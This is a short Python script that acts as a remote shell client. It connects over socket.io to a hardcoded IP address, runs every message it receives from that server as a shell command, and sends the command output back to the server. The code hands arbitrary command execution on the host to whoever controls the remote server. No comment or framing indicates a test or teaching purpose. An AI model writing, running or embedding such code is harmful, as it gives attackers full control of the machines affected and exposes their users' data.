import socketio
import subprocess
import  requests

sio = socketio.Client()


@sio.event
def connect():
    print('Connected to server')


@sio.event
def message(data):
    print('Received message from server: ' + data)
    try:
        output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
        sio.emit('output', output.decode())
    except subprocess.CalledProcessError as e:
        sio.emit('error', e.output.decode())



if __name__ == '__main__':
    sio.connect('http://185.8.174.133:5000')
    sio.wait()
